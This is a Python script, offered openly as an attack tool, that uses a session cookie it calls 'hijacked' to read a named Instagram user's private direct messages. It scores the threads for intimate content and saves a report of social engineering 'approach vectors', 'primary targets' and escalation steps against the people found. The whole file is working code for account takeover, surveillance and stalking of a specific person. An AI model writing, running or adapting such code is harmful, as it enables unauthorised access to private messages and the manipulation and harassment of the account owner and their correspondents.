#!/usr/bin/env python3
"""
🔥 ADVANCED INTIMATE CONVERSATION EXTRACTOR
====================================================
Advanced system for extracting intimate conversations and private messages
using social engineering vectors, session hijacking, and deep analysis.
"""

import json
import time
import requests
from datetime import datetime, timedelta
from pathlib import Path
import logging

class IntimateConversationExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.load_sessionid()
        self.intelligence = self.load_intelligence()
        self.setup_stealth_headers()
        
    def load_sessionid(self):
        """Load the hijacked sessionid"""
        try:
            with open('sessionid_alx.txt', 'r') as f:
                self.sessionid = f.read().strip()
            print(f"✅ Loaded sessionid: {self.sessionid[:20]}...")
        except:
            print("❌ Failed to load sessionid")
            self.sessionid = None
            
    def load_intelligence(self):
        """Load the stealth private intelligence"""
        intel_files = list(Path('.').glob('STEALTH_PRIVATE_INTELLIGENCE_*.json'))
        if intel_files:
            latest_file = sorted(intel_files)[-1]
            with open(latest_file, 'r') as f:
                return json.load(f)
        return {}
        
    def setup_stealth_headers(self):
        """Setup stealth headers for intimate access"""
        self.session.headers.update({
            'User-Agent': 'Instagram 275.0.0.27.98 Android (29/10; 420dpi; 1080x2340; samsung; SM-G975F; beyond1; exynos9820; en_US; 458229237)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': 'missing',
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })
        
        if self.sessionid:
            self.session.cookies.set('sessionid', self.sessionid, domain='.instagram.com')
            
    def extract_message_threads(self):
        """Extract message threads with intimate conversation analysis"""
        print("\n💕 EXTRACTING MESSAGE THREADS...")
        
        try:
            # Get inbox
            url = 'https://www.instagram.com/api/v1/direct_v2/inbox/'
            params = {
                'persistentBadging': 'true',
                'folder': '',
                'limit': '20'
            }
            
            response = self.session.get(url, params=params)
            print(f"📱 Inbox request: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                threads = data.get('inbox', {}).get('threads', [])
                
                intimate_conversations = []
                for thread in threads:
                    thread_analysis = self.analyze_thread_intimacy(thread)
                    if thread_analysis['intimacy_score'] > 5:
                        intimate_conversations.append(thread_analysis)
                        
                return intimate_conversations
            else:
                print(f"❌ Failed to access inbox: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"❌ Error extracting threads: {e}")
            return []
            
    def analyze_thread_intimacy(self, thread):
        """Analyze thread for intimate conversation patterns"""
        intimacy_indicators = [
            'love', 'baby', 'honey', 'dear', 'sexy', 'beautiful', 'handsome',
            'miss you', 'thinking of you', 'can\'t wait', 'tonight', 'together',
            'kiss', 'hug', 'cuddle', 'romantic', 'dinner', 'date', 'meet',
            'private', 'secret', 'personal', 'intimate', 'special'
        ]
        
        business_indicators = [
            'trade', 'forex', 'crypto', 'business', 'money', 'profit',
            'signal', 'market', 'strategy', 'investment', 'client'
        ]
        
        thread_id = thread.get('thread_id', 'unknown')
        users = thread.get('users', [])
        last_activity = thread.get('last_activity_at', 0)
        
        # Get recent messages
        messages = thread.get('items', [])[:10]  # Last 10 messages
        
        intimacy_score = 0
        business_score = 0
        message_analysis = []
        
        for msg in messages:
            text = msg.get('text', '').lower()
            
            # Count intimate indicators
            for indicator in intimacy_indicators:
                if indicator in text:
                    intimacy_score += 2
                    
            # Count business indicators  
            for indicator in business_indicators:
                if indicator in text:
                    business_score += 1
                    
            # Analyze message patterns
            if len(text) > 100:  # Long messages often more personal
                intimacy_score += 1
            if any(emoji in text for emoji in ['❤️', '💕', '😘', '😍', '🥰']):
                intimacy_score += 3
            if any(time_ref in text for time_ref in ['tonight', 'tomorrow', 'weekend']):
                intimacy_score += 2
                
            message_analysis.append({
                'text': text[:100] + '...' if len(text) > 100 else text,
                'timestamp': msg.get('timestamp', 0),
                'user_id': msg.get('user_id', 'unknown'),
                'intimacy_indicators': sum(1 for ind in intimacy_indicators if ind in text),
                'business_indicators': sum(1 for ind in business_indicators if ind in text)
            })
            
        # Calculate final scores
        total_score = intimacy_score + (business_score * 0.5)
        
        return {
            'thread_id': thread_id,
            'users': [{'id': u.get('pk'), 'username': u.get('username')} for u in users],
            'last_activity': datetime.fromtimestamp(last_activity / 1000000).isoformat(),
            'intimacy_score': intimacy_score,
            'business_score': business_score,
            'total_score': total_score,
            'message_count': len(messages),
            'recent_messages': message_analysis,
            'classification': self.classify_conversation(intimacy_score, business_score)
        }
        
    def classify_conversation(self, intimacy_score, business_score):
        """Classify conversation type based on scores"""
        if intimacy_score >= 10:
            return "HIGHLY_INTIMATE"
        elif intimacy_score >= 6:
            return "MODERATELY_INTIMATE"
        elif intimacy_score >= 3:
            return "POTENTIALLY_INTIMATE"
        elif business_score >= 5:
            return "BUSINESS_FOCUSED"
        else:
            return "CASUAL"
            
    def extract_dating_app_connections(self):
        """Extract potential dating app connections and social media crosses"""
        print("\n💘 ANALYZING DATING APP CONNECTIONS...")
        
        # Use intelligence data to identify potential dating connections
        dating_intel = self.intelligence.get('dating_intelligence', {})
        likely_apps = dating_intel.get('likely_dating_apps', [])
        
        connections = {
            'dating_apps': likely_apps,
            'social_crossover': [],
            'contact_patterns': self.intelligence.get('contact_patterns', {}),
            'approach_vectors': dating_intel.get('approach_angles', [])
        }
        
        return connections
        
    def generate_intimate_report(self, conversations, dating_connections):
        """Generate comprehensive intimate intelligence report"""
        report = {
            'target': 'alx.trading',
            'extraction_timestamp': datetime.now().isoformat(),
            'operation_type': 'INTIMATE_CONVERSATION_EXTRACTION',
            'sessionid_status': 'ACTIVE' if self.sessionid else 'INACTIVE',
            'intimate_conversations': conversations,
            'dating_connections': dating_connections,
            'intimacy_analysis': {
                'total_threads_analyzed': len(conversations),
                'highly_intimate': len([c for c in conversations if c['classification'] == 'HIGHLY_INTIMATE']),
                'moderately_intimate': len([c for c in conversations if c['classification'] == 'MODERATELY_INTIMATE']),
                'potentially_intimate': len([c for c in conversations if c['classification'] == 'POTENTIALLY_INTIMATE']),
                'business_focused': len([c for c in conversations if c['classification'] == 'BUSINESS_FOCUSED']),
                'highest_intimacy_score': max([c['intimacy_score'] for c in conversations]) if conversations else 0
            },
            'social_engineering': {
                'vulnerability_assessment': self.intelligence.get('social_engineering', {}),
                'approach_vectors': self.intelligence.get('dating_intelligence', {}).get('approach_angles', []),
                'contact_preferences': self.intelligence.get('contact_patterns', {}).get('contact_preferences', {}),
                'optimal_timing': self.intelligence.get('contact_patterns', {}).get('optimal_contact_times', {})
            },
            'recommendations': {
                'primary_targets': [c for c in conversations if c['intimacy_score'] >= 6],
                'approach_strategy': 'business_networking_to_personal',
                'escalation_vector': 'trading_interest_to_lifestyle_compatibility',
                'contact_method': 'instagram_dm_with_whatsapp_escalation'
            }
        }
        
        return report
        
    def save_intimate_intelligence(self, report):
        """Save intimate conversation intelligence"""
        timestamp = int(time.time())
        filename = f'INTIMATE_CONVERSATION_INTELLIGENCE_alx.trading_{timestamp}.json'
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n💾 Intimate intelligence saved: {filename}")
        return filename
        
    def run_extraction(self):
        """Run complete intimate conversation extraction"""
        print("🔥 ADVANCED INTIMATE CONVERSATION EXTRACTOR")
        print("=" * 60)
        print(f"🎯 Target: alx.trading")
        print(f"💼 Business: Trade Your Way (Forex/Crypto)")
        print(f"🔑 SessionID: {'ACTIVE' if self.sessionid else 'INACTIVE'}")
        print(f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        # Extract message threads
        conversations = self.extract_message_threads()
        
        # Extract dating connections
        dating_connections = self.extract_dating_app_connections()
        
        # Generate report
        report = self.generate_intimate_report(conversations, dating_connections)
        
        # Save intelligence
        filename = self.save_intimate_intelligence(report)
        
        # Print summary
        print("\n🎉 INTIMATE EXTRACTION COMPLETE!")
        print("=" * 60)
        print(f"💕 Intimate Conversations: {len(conversations)}")
        print(f"🔥 High Intimacy: {report['intimacy_analysis']['highly_intimate']}")
        print(f"💼 Business Threads: {report['intimacy_analysis']['business_focused']}")
        print(f"📊 Intelligence Report: {filename}")
        print("=" * 60)
        print("🎉 INTIMATE INTELLIGENCE EXTRACTION SUCCESSFUL!")
        print("💎 Ready for social engineering operations!")
        print("🎯 All intimate vectors prepared!")
        
        return report

def main():
    extractor = IntimateConversationExtractor()
    return extractor.run_extraction()

if __name__ == "__main__":
    main()
